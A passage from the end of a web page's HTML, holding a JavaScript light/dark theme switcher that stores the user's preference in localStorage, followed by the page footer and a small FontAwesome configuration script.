    document.documentElement.classList.remove('theme--dark');
	document.getElementById("theme-toggle").className = 'dark';
} else if  (userPrefers === "dark") {
    document.getElementById('theme-toggle').checked = false;
    document.documentElement.setAttribute('data-theme', 'dark');
	document.documentElement.classList.add('theme--dark');
    document.documentElement.classList.remove('theme--light');
	window.localStorage.setItem('theme', 'dark');
	document.getElementById("theme-toggle").className = 'light';
} else {
    document.getElementById('theme-toggle').checked = true;
    document.documentElement.setAttribute('data-theme', 'light');
	document.documentElement.classList.add('theme--light');
    document.documentElement.classList.remove('theme--dark');
	window.localStorage.setItem('theme', 'light');
	document.getElementById("theme-toggle").className = 'dark';
}

function modeSwitcher() {
	let currentMode = document.documentElement.getAttribute('data-theme');
	if (currentMode === "dark") {
	    document.documentElement.setAttribute('data-theme', 'light');
		document.documentElement.classList.add('theme--light');
        document.documentElement.classList.remove('theme--dark');
		window.localStorage.setItem('theme', 'light');
	    document.getElementById("theme-toggle").className = 'dark';
	} else {
	    document.documentElement.setAttribute('data-theme', 'dark');
		document.documentElement.classList.add('theme--dark');
        document.documentElement.classList.remove('theme--light');
		window.localStorage.setItem('theme', 'dark');
	    document.getElementById("theme-toggle").className = 'light';
	}
}
</script>
</div>
  
</footer>


<script>
      window.FontAwesomeConfig = {
        searchPseudoElements: true
      }
    </script>
  </body>

</html>
